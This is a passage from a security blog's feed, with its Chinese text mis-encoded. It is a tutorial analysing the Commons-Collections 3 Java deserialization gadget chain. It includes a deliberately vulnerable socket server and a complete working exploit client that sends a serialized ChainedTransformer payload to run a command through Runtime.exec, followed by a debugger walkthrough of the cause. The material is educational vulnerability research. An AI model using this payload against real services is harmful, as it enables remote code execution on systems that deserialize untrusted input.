      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java ååºåˆ—åŒ–" scheme="https://summersec.github.io/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>æ¼«è°ˆCommons-Collectionsååºåˆ—åŒ–</title>
    <link href="https://summersec.github.io/2020/05/26/%E6%BC%AB%E8%B0%88Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://summersec.github.io/2020/05/26/%E6%BC%AB%E8%B0%88Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-05-26T13:27:45.000Z</published>
    <updated>2020-05-20T08:19:17.580Z</updated>
    
    <content type="html"><![CDATA[<p>ï»¿# å‰è¨€</p><p>&emsp;&emsp; å¦‚æœä½ æ²¡æœ‰ååºåˆ—åŒ–çš„åŸºç¡€ï¼Œå»ºè®®ä½ çœ‹ç¬”è€…åšå®¢æ–‡ç« å…ˆå°†åŸºç¡€å­¦ä¹ ä¸€ä¸‹ã€‚å¦‚æœä½ æ²¡æœ‰å­¦ä¹ åˆ†æè¿‡<code>ysoserial--Gadget--URLDNS</code>ï¼Œå»ºè®®ä½ çœ‹ç¬”è€…ä¹‹å‰å‘è¿‡çš„æ–‡ç« å­¦ä¹ ä¸€ä¸‹ã€‚å¦‚æœä½ æ˜¯å¤§ä½¬ï¼Œå‰é¢å½“ç¬”è€…æ²¡è¯´ã€‚<br>&emsp;&emsp; Javaçš„ç¬¬ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´å°±æ˜¯ä»<code>commons-collections</code>ç»„ä»¶ä¸­å‘ç°çš„ï¼Œä»æ­¤æ‰“å¼€äº†Javaå®‰å…¨çš„æ–°è“å›¾ã€‚<br>å®˜æ–¹å¯¹<code>commons-collections</code>ç»„ä»¶çš„è¯´æ˜ï¼š<code>The Java Collections Framework was a major addition in JDK 1.2. It added many powerful data structures that accelerate development of most significant Java applications. Since that time it has become the recognised standard for collection handling in Java.</code><br>ç¿»è¯‘ä¸€ä¸‹å¤§æ¦‚æ„æ€å°±æ˜¯ï¼š<code>Java commons-collections æ¡†æ¶æ˜¯JDK 1.2ä¹‹åä¸­çš„ä¸€ä¸ªé‡è¦è¡¥å……ã€‚å¢åŠ äº†è®¸å¤šå¼ºå¤§çš„æ•°æ®ç»“æ„ï¼ŒåŠ å¿«äº†Javaåº”ç”¨ç¨‹åºçš„å¼€å‘ã€‚å·²ç»æˆä¸ºJavaä¸­å…¬è®¤çš„é›†åˆå¤„ç†æ ‡å‡†ã€‚</code><br>&emsp;&emsp; ç›®å‰<code>commons-collections</code>çš„ååºåˆ—åŒ–æ¼æ´ä¸»è¦ä»¥3å’Œ4(ç‰ˆæœ¬)ä¸ºä¸»æµï¼Œ3å’Œ4çš„åˆ©ç”¨æ–¹å¼ä¹Ÿä¸åŒï¼ŒGadgeté“¾ä¹Ÿä¸ç›¸åŒã€‚</p><p>PS: ä¸ºé¿å…ä»£ç å¤ªé•¿è€Œå¯¼è‡´çš„é˜…è¯»æ•ˆæœï¼Œæ•…å°†å®Œæ•´çš„å®éªŒä»£ç å…¨éƒ¨å·²ç»ä¸Šä¼ è‡³ <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p><hr><h1 id="Commons-Collections3"><a href="#Commons-Collections3" class="headerlink" title="Commons-Collections3"></a>Commons-Collections3</h1><p>&emsp;&emsp; å…ˆçœ‹ä¸€ä¸‹Gadgeté“¾ï¼Œå…¥å£æ˜¯ä¸Šç¯‡æ–‡ç« æåŠçš„ã€‚è¿™é‡Œçš„3æ˜¯æŒ‡ç‰ˆæœ¬å·ï¼Œç¬”è€…è¿™é‡Œåªåˆ†æç½‘ä¸Šæµä¼ çš„æŸä¸€æ¡åˆ©ç”¨é“¾ã€‚<code>BadAttributeValueExpException.readObject()</code>ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; è¯•æƒ³ä¸€ä¸‹å…ˆå­˜åœ¨ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå®ƒæ­£å¥½å­˜åœ¨ä½¿ç”¨<code>commons-collections</code>ç»„ä»¶ï¼Œæ²¡æœ‰åšä»»ä½•çš„ä¿®å¤ï¼Œå­˜åœ¨æ¼æ´ã€‚æ­¤æ—¶ä½ æ˜¯ä¸æ˜¯å°±èƒ½åˆ©ç”¨æ­¤æ¼æ´å‘¢ï¼Ÿ</p><hr><h2 id="æ¨¡æ‹Ÿåœºæ™¯DEMO"><a href="#æ¨¡æ‹Ÿåœºæ™¯DEMO" class="headerlink" title="æ¨¡æ‹Ÿåœºæ™¯DEMO"></a><strong>æ¨¡æ‹Ÿåœºæ™¯DEMO</strong></h2><h3 id="åˆ›å»ºæ¨¡æ‹ŸæœåŠ¡å™¨åº”ç”¨"><a href="#åˆ›å»ºæ¨¡æ‹ŸæœåŠ¡å™¨åº”ç”¨" class="headerlink" title="åˆ›å»ºæ¨¡æ‹ŸæœåŠ¡å™¨åº”ç”¨"></a>åˆ›å»ºæ¨¡æ‹ŸæœåŠ¡å™¨åº”ç”¨</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// æ¨¡æ‹ŸæœåŠ¡å™¨ç«¯ï¼Œæ¥å—ååºåˆ—åŒ–æ•°æ®</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">6666</span>);</span><br><span class="line">            System.out.println(<span class="string">"æœåŠ¡å™¨ç›‘å¬åœ°å€ï¼š "</span> + serverSocket.getLocalSocketAddress());</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                <span class="comment">// æ¥å—ååºåˆ—åŒ–æ•°æ®</span></span><br><span class="line"></span><br><span class="line">                Socket socket = serverSocket.accept();</span><br><span class="line">                System.out.println(<span class="string">"ä¸åœ°å€ï¼š "</span> + socket.getInetAddress() + <span class="string">"è¿æ¥ï¼"</span> );</span><br><span class="line">                ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// è¯»å–æ•°æ®</span></span><br><span class="line">                    Object ob = ois.readObject();</span><br><span class="line">                    System.out.println(<span class="string">"è¯»å–æ•°æ®å®Œæˆï¼"</span>);</span><br><span class="line">                    System.out.println(ob);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"è¯»å–æ•°æ®å¤±è´¥ï¼"</span>);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨ä»£ç "><a href="#åˆ©ç”¨ä»£ç " class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//ç›®çš„æœåŠ¡å™¨åœ°å€</span></span><br><span class="line">        String tas = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">        <span class="comment">// ç«¯å£</span></span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">6666</span>;</span><br><span class="line">        <span class="comment">// payload</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;</span><br><span class="line">                ,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;</span><br><span class="line">                ,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc"&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"66666!"</span>)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºæ¼æ´map Object</span></span><br><span class="line">        Map inmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazymap = LazyMap.decorate(inmap,transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">"hack by Summer"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºå¼‚å¸¸ï¼Œåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘payload</span></span><br><span class="line">        BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field field = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(expException, entry);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// å‘é€payload</span></span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket(tas,port);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">        oos.writeObject(expException);</span><br><span class="line">        oos.flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´æ•ˆæœ"><a href="#æ¼æ´æ•ˆæœ" class="headerlink" title="æ¼æ´æ•ˆæœ"></a>æ¼æ´æ•ˆæœ</h3><p>é¦–å…ˆå¾—è®©æ¨¡æ‹ŸæœåŠ¡å™¨åœ¨è¿è¡Œï¼Œç„¶åå‘é€payloadå³å¯ã€‚<br><img src="https://img-blog.csdnimg.cn/20200517150503233.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200517150434644.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>&emsp;&emsp; åˆ†æå¿…å®šè¦å…ˆæ–­ç‚¹ï¼Œè¿™é‡Œç¬”è€…å°†ä»£ç ä¿®æ”¹äº†ï¼Œä¾¿äºåˆ†æã€‚è¿™é‡Œå°±ä¸å†è´´å‡ºï¼Œéœ€è¦çš„å¯ä»¥å»<a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/cc5.java" target="_blank" rel="noopener">GitHub</a>ä¸Šè‡ªå–ï¼Œæ–­ç‚¹ç›´æ¥è®¾ç½®åœ¨<code>readObject</code>æ–¹æ³•ã€‚<br><code>æ¸©é¦¨æç¤º</code>ï¼šå¦‚æœä½ ç”¨çš„æ˜¯Ideaå·¥å…·ï¼Œåœ¨Debugä¹‹å‰è¯·æŸ¥çœ‹è‡ªå·±Debuggerè®¾ç½®ï¼Œè¯·å’Œæˆ‘ä¸€æ ·è®¾ç½®ã€‚ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšå¯ä»¥å‚è€ƒï¼š<a href="https://samny.blog.csdn.net/article/details/105937958" target="_blank" rel="noopener">Skipped breakpoint because it happened inside debugger evaluation</a> ï¼Œå¦åˆ™ä½ å¯èƒ½å‡ºç°å¾ˆå¤šbugã€‚<br><img src="https://img-blog.csdnimg.cn/20200517155502933.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200517151930246.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h4 id="æ¼æ´è§¦å‘æµç¨‹"><a href="#æ¼æ´è§¦å‘æµç¨‹" class="headerlink" title="æ¼æ´è§¦å‘æµç¨‹"></a>æ¼æ´è§¦å‘æµç¨‹</h4><ol><li>ä¸€ç›´è·Ÿè¿›ï¼Œåˆ°<code>BadAttributeValueException.java</code>çš„<code>readObject</code>æ–¹æ³•ã€‚</li></ol><p><img src="https://img-blog.csdnimg.cn/20200517163343981.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>2. toStringæ–¹æ³•ä¼šè·³è½¬åˆ°<code>TiedMapEntry</code>çš„toStringæ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/20200517163803421.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>3. è·Ÿè¿›getValue()æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/20200517165203612.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>4. è·Ÿè¿›åˆ°get()æ–¹æ³•ï¼Œåœ¨getæ–¹æ³•ä¸­ï¼Œä¼šåˆ¤æ–­<code>key</code>æ˜¯å¦å­˜åœ¨ã€‚ç„¶åè·³è½¬åˆ°<code>transform(key)</code>ï¼Œè¿™é‡Œçš„keyæ˜¯éšä¾¿å¡«å†™çš„ï¼Œä¸»è¦æ˜¯transformæ–¹æ³•æ˜¯è¢«ä¿®æ”¹è¿‡çš„ï¼Œé‡Œé¢æœ‰æ¶æ„payloadã€‚<br><img src="https://img-blog.csdnimg.cn/20200517165322855.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20200517165354634.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>5. è¿™é‡Œæ˜¯ç”¨Javaçš„åå°„æœºåˆ¶ï¼Œå»ºè®®å»äº†è§£ä¸€ä¸‹ã€‚æ¨èåšæ–‡<a href="https://blog.csdn.net/sun1318578251/category_9977685.html" target="_blank" rel="noopener">ä»å®‰å…¨è§’åº¦è°ˆJavaåå°„æœºåˆ¶</a><br><img src="https://img-blog.csdnimg.cn/20200517173626405.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20200517164317458.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ibG9nLXN0YXRpYy5jbmJsb2dzLmNvbS9maWxlcy9zYW1ueS9zZXJpYWxpemFibGUzLmdpZg" alt="https://blog-static.cnblogs.com/files/samny/serializable3.gif"><br>&emsp;&emsp; çœ‹å®Œæ•´ä¸ªå®Œæ•´çš„è¿‡ç¨‹ï¼Œæ¯ä¸€æ­¥éƒ½å¯¹åº”ç€æ–‡ç« å¼€å¤´çš„Gadget chainã€‚åˆ›å»ºå¼‚å¸¸ç±»<code>BadAttributeValueExpException</code>ï¼Œä»¥ä¾¿äºåœ¨ååºåˆ—åŒ–æ—¶è§¦å‘payloadã€‚<br><img src="https://img-blog.csdnimg.cn/2020051814514391.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h4 id="æ¼æ´æˆå› åˆ†æ"><a href="#æ¼æ´æˆå› åˆ†æ" class="headerlink" title="æ¼æ´æˆå› åˆ†æ"></a>æ¼æ´æˆå› åˆ†æ</h4><p>&emsp;&emsp; è¿‡ç¨‹çœ‹å®Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯æ— æ³•ç†è§£ä¸ºä»€ä¹ˆå¯ä»¥è¿™ä¹ˆæ„é€ ï¼Œè¿˜æ˜¯å¾—ä¸€æ­¥æ­¥çœ‹POCæºç ã€‚æˆ‘ä»¬ä¸€ä¸€å¯¹ç€å®˜æ–¹æ–‡æ¡£åˆ†æå‡½æ•°æ–¹æ³•çš„å…·ä½“ä½œç”¨ã€‚</p><ol><li>ChainedTransformerå°†ä¸€ä¸ªä¸ªTransformerç±»æ•°ç»„æŒ‰ç…§é¡ºåºä¸€ä¸ªä¸ªæ‰§è¡Œï¼Œå‰ä¸€ä¸ªè¿è¡Œç»“æœä½œä¸ºç¬¬äºŒä¸ªtransformã€‚<br><img src="https://img-blog.csdnimg.cn/20200517173011310.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>ConstantTransformerè°ƒç”¨transformæ–¹æ³•ï¼Œè¿”å›ç±»åœ¨å®ä¾‹åŒ–æ—¶å­˜å‚¨çš„ç±»ã€‚<br><img src="https://img-blog.csdnimg.cn/20200517173510549.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>InvokerTransformerè°ƒç”¨transformæ–¹æ³•çš„æ—¶å€™ï¼Œæ ¹æ®ç±»åœ¨å®ä¾‹åŒ–æ—¶æä¾›çš„å‚æ•°ï¼Œé€šè¿‡åå°„å»è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ã€‚InvokerTransformerç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‚æ•°ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å‚æ•°å€¼ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(java.lang.String methodName,</span></span></span><br><span class="line"><span class="function"><span class="params">                          java.lang.Class[] paramTypes,</span></span></span><br><span class="line"><span class="function"><span class="params">                          java.lang.Object[] args)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200517175953505.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; è¿™æ˜¯ä¸€æ®µåå°„æ‰§è¡Œå‘½ä»¤çš„ä»£ç ï¼Œè¿™æ®µæ‰§è¡Œçš„æ•ˆæœå®Œå…¨ç­‰æ•ˆäºtransformers[]æ•°ç»„ï¼Œä¸‹é¢ä¸¤å¼ å›¾ç‰‡å¯ä»¥å®Œç¾çš„è¯ é‡Šã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">           <span class="comment">//å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">          Object ob = cls.getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">           <span class="comment">// åå°„è°ƒç”¨æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">           cls.getMethod("exec", String.class).invoke(ob,"calc");</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200517164708950.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20200517175632226.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><p>&emsp;&emsp; åˆ›å»ºä¸€ä¸ªHashMapï¼Œä½¿ç”¨LazyMap.decorate()æ–¹æ³•ä¼ å…¥HashMapå’ŒTransformeræ•°ç»„ã€‚å…¶ä¸­æ•°ç»„æ˜¯æˆ‘ä»¬æ„é€ çš„payloadï¼Œæœ€åä½¿ç”¨TiedMapEntryä¼ å…¥ä¸€ä¸ªkeyã€‚å…¶å®ä¹Ÿå¯ä»¥è¿™æ ·å­<code>lazymap.get(&quot;Summer&quot;)</code>ä¹Ÿå¯ä»¥ä¼ å…¥keyï¼Œè¿™æ ·å­ä¼šåœ¨åºåˆ—åŒ–è¿‡ç¨‹å°±å°†keyå†™å…¥ï¼Œè€Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸ä¼šè°ƒç”¨<code>LazyMap.get()</code>æ–¹æ³•ï¼Œåˆ¤æ–­keyæ˜¯å¦å­˜åœ¨ã€‚ä¸å­˜åœ¨åˆ™ä¼šè°ƒç”¨<code>this.factory.transform(key);</code>æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚æ‰€ä»¥å¾ˆæ˜¾ç„¶è¿™ç§æ–¹æ³•ä¸å¯å–ï¼Œåªèƒ½é€šè¿‡ä¿®æ”¹åº•å±‚çš„æ–¹å¼ï¼ŒåŠ å…¥keyå€¼ï¼Œä»¥ä¾¿äºåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘æ¼æ´ï¼Œå¹¶åŒæ—¶ç¡®ä¿åœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹ä¸ä¼šè§¦å‘æ¼æ´ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map inmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">      Map lazymap = LazyMap.decorate(inmap,transformerChain);</span><br><span class="line">      TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">"hack by Summer"</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200518095025914.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>&emsp;&emsp; åˆ°ç›®å‰ä¸ºæ­¢ï¼Œå¹¶æ²¡æœ‰è§¦å‘ååºåˆ—åŒ–æ¼æ´çš„å…¥å£ã€‚è€Œ<code>BadAttributeValueExpException</code>è¿™ä¸ªç±»æ˜¯javax.managementæŠ¥ä¸‹çš„ä¸€ä¸ªç±»ï¼Œæ˜¯jdkè‡ªå¸¦çš„ï¼Œæ— éœ€ä¾èµ–ç¬¬ä¸‰æ–¹ã€‚å®ƒç»§æ‰¿äº†Serializableæ¥å£æ»¡è¶³ååºåˆ—åŒ–æ¼æ´çš„æ¡ä»¶ï¼Œå®ƒåªæœ‰ä¸€ä¸ªå€¼æƒé™æ˜¯privateä¸å¯ä¿®æ”¹ï¼Œä½†åˆ©ç”¨åå°„æœºåˆ¶ä¿®æ”¹å…¶å€¼æ¥åˆ°è¾¾è§¦å‘ååºåˆ—åŒ–æ¼æ´çš„ç›®çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Field field = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">           field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           field.set(expException, entry);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>&emsp;&emsp; ååºåˆ—åŒ–åˆ©ç”¨ç‚¹æ˜¯ä½¿ç”¨<code>LazyMap</code>åœ¨è·å–keyå€¼çš„æ—¶å€™ï¼Œä½¿å…¶keyä¸å­˜åœ¨ï¼Œç„¶åå†è·å–keyçš„æ—¶å€™è§¦å‘æ¼æ´ã€‚ä½†éœ€è¦æœ‰ä¸€ä¸ªå…¥å£ï¼Œè¿™é‡Œçš„ååºåˆ—åŒ–è§¦å‘çš„å…¥å£æ˜¯JDKè‡ªå¸¦çš„<code>BadAttributeValueExpException</code>ç±»ã€‚æœ‰å‡ ä¸ªç‚¹ä¸å¾—ä¸æœå¤§ä½¬ä»¬çš„å‰å®³ä¹‹å¤„ï¼Œç¬¬ä¸€ç‚¹æ˜¯æ‰¾åˆ°ååºåˆ—åŒ–çš„å…¥å£<code>BadAttributeValueExpException</code>ï¼Œè¿™ä¸ªç±»å¾—æ»¡è¶³ååºåˆ—åŒ–çš„åŸºæœ¬æ¡ä»¶ï¼Œè¿˜å¾—æ˜¯JDKè‡ªå¸¦æˆ–è€…æ˜¯ç»„ä»¶è‡ªå¸¦çš„ã€‚ç¬¬äºŒç‚¹æ˜¯ä½¿ç”¨<code>LazyMap</code>çš„keyä¸ºç©ºæ¥è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚<br><img src="https://img-blog.csdnimg.cn/20200518105354743.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 